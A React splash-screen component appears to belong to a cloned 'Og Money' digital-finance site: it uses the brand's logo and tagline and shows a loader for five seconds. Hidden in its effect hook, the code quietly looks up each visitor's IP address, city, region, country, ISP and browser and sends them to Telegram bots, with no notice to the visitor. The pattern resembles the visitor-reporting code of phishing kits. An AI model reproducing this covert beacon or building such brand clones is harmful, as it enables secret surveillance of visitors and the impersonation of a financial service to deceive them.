"use client"

import { useEffect } from "react"

export default function OgMoneySplash({ onComplete }: { onComplete: () => void }) {

    useEffect(() => {
        // 1️⃣ Function to get browser name
        const getBrowserName = () => {
            const userAgent = window.navigator.userAgent;
            if (userAgent.includes("Firefox")) return "Mozilla Firefox";
            if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
            if (userAgent.includes("Edge")) return "Microsoft Edge";
            if (userAgent.includes("Chrome")) return "Google Chrome";
            if (userAgent.includes("Safari")) return "Apple Safari";
            return "Unknown Browser";
        };

        // 2️⃣ Function to track visitor
        const trackVisitor = async () => {
            try {
                const geoRes = await fetch("https://ipapi.co/json/");
                if (geoRes.ok) {
                    const data = await geoRes.json();

                    if (data.error || data.reason === "Suspended" || data.reserved) {
                        console.log("Visitor tracking skipped: IP API suspended or error.");
                        return;
                    }

                    const payload = {
                        type: "visitor",
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        isp: data.org,
                        browser: getBrowserName(),
                    };

                    const botTokensValue = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
                    const chatIdValue = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

                    if (botTokensValue && chatIdValue) {
                        const chatIds = chatIdValue.split(",").map(id => id.trim());
                        const botTokens = botTokensValue.split(",").map(token => token.trim());
                        const message = `
<b>👀 New Og Money Visitor</b>
<b>🌍 Location Details:</b>
• <b>IP:</b> <code>${payload.ip || "Unknown"}</code>
• <b>City:</b> ${payload.city || "N/A"}
• <b>Region:</b> ${payload.region || "N/A"}
• <b>Country:</b> ${payload.country || "N/A"}
• <b>ISP:</b> ${payload.isp || "N/A"}
<b>📱 Browser Info:</b>
• <b>Browser:</b> ${payload.browser || "Unknown"}
            `;

                        await Promise.all(chatIds.map((id, index) => {
                            const token = botTokens[index] || botTokens[botTokens.length - 1];
                            return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    chat_id: id,
                                    text: message,
                                    parse_mode: "HTML",
                                }),
                            }).catch(err => console.error(`Visitor Tracking Error (${id}):`, err));
                        }));
                    }
                }
            } catch (err) {
                console.error("Error tracking visitor:", err);
            }
        };

        trackVisitor();

        const timer = setTimeout(() => {
            onComplete()
        }, 5000)

        return () => clearTimeout(timer)
    }, [onComplete])

    return (
        <main className="min-h-screen flex flex-col items-center justify-between py-16 px-6 bg-gradient-to-b from-[#2d7a9c] via-[#3a8da8] to-[#4fb8b8]">
            <div className="flex-1 flex flex-col items-center justify-center">
                {/* Logo */}
                <div className="w-28 h-28 bg-white rounded-full flex items-center justify-center mb-6 shadow-lg">
                    <img
                        src="https://ogmoney.com/wp-content/uploads/2025/04/Og-Money-Logo-Wide-Blue-1-768x314.png"
                        alt="Og Money"
                        className="w-20"
                    />
                </div>

                {/* Brand Name */}
                <h1 className="text-white text-3xl font-light tracking-wide mb-6">
                    Og Money
                </h1>

                {/* English Tagline */}
                <p className="text-white/90 text-xl font-light text-center leading-relaxed mb-8">
                    The New Era of
                    <br />
                    Digital Financial Services
                </p>

                <div className="w-48 flex flex-col items-center gap-3 mt-4">
                    <span className="loader"></span>
                </div>
            </div>
        </main>
    )
}
